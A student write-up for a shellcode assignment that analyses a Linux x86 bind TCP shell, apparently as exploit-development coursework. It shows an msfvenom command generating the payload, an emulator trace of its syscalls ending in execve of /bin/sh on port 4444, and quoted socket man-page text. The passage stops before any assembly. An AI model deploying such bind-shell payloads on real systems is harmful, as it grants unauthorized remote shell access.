
Assignment # 1
• Create a Shell_Bind_TCP shellcode
–Binds	to a port		
–Execs	Shell on incoming connection 
• Port number should be easily configurable

Analysis of a Bind TCP shell

Before writing a shell Bind TCP, first we will analysis of a Bind TCP shell. This will be helpful for understand the components to
wirte "Bind TCP shell" assembly code i.e. nasm file. We took the support of msfvenom payload (linux/x86/shell_bind_tcp) & Libemu. 

For that we need to execute the following command: 

msfvenom -p linux/x86/shell_bind_tcp -f raw -a x86 --platform linux | /usr/bin/sctest -vvv -S -s 100000

// only main part is given below, detail output is trunked //

[emu 0x0x816e480 debug ] Flags: PF SF
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 =>
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 =>
         none;
     int addrlen = 0x00000010 =>
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 14;
) =  14;
int dup2 (
     int oldfd = 19;
     int newfd = 13;
) =  13;
int dup2 (
     int oldfd = 19;
     int newfd = 12;
) =  12;
int dup2 (
     int oldfd = 19;
     int newfd = 11;
) =  11;
int dup2 (
     int oldfd = 19;
     int newfd = 10;
) =  10;
int dup2 (
     int oldfd = 19;
     int newfd = 9;
) =  9;
int dup2 (
     int oldfd = 19;
     int newfd = 8;
) =  8;
int dup2 (
     int oldfd = 19;
     int newfd = 7;
) =  7;
int dup2 (
     int oldfd = 19;
     int newfd = 6;
) =  6;
int dup2 (
     int oldfd = 19;
     int newfd = 5;
) =  5;
int dup2 (
     int oldfd = 19;
     int newfd = 4;
) =  4;
int dup2 (
     int oldfd = 19;
     int newfd = 3;
) =  3;
int dup2 (
     int oldfd = 19;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 19;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fb2 =>
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa =>
               = 0x00416fb2 =>
                   = "/bin//sh";
           = 0x00000000 =>
             none;
     ];
     const char * envp[] = 0x00000000 =>
         none;
) =  0;

So, from the above analysis, we found that following components is necessary for create Shell_Bind_TCP shellcode

a. socket
b. bind
c. listen
d. accept
d. dup2
e. execve

For for the assembly we need to consider the following concept:

1. Create a socket with the socket() system call
2. Bind the socket to an address using the bind() system call. For a server socket on the Internet, an address consists of a port number on the host machine.
3. Listen for connections with the listen() system call
4. Accept a connection with the accept() system call. This call typically blocks until a client connects with the server.
5. Send and receive data 


1. Create a socket

From our x86 Linux system : man 2 socket [stated:]

DESCRIPTION
       socket() creates an endpoint for communication and returns a descriptor.
And Deployment method is  
       int socket(int domain, int type, int protocol);

int domain:	   
 The domain argument specifies a communication domain, we will use following: 
 
   AF_INET             IPv4 Internet protocols          ip(7)

int type:
  The socket has the indicated type, which specifies the communication semantics,we will use following: 

SOCK_STREAM     Provides sequenced, reliable, two-way, connection-based byte streams.  An out-of-band data transmission mechanism may be supported.

int protocol:

The protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular
socket type  within a  given  protocol  family, in which case protocol can be specified as 0. 
 
Sockets  of type SOCK_STREAM are full-duplex byte streams.  They do not preserve record boundaries.  A stream socket must be in a 
connected state before any data may be sent or received on it.  A connection to another socket is created with a connect(2) call.   
Once  connected,  data  may  be  transferred  using read(2)  and  write(2)  calls or some variant of the send(2) and recv(2) calls. 
When a session has been completed a close(2) may be performed. Out-of-band data may also be transmitted as described in send(2) and 
received as described in recv(2).

The communications protocols which implement a SOCK_STREAM ensure that data is not lost or duplicated.
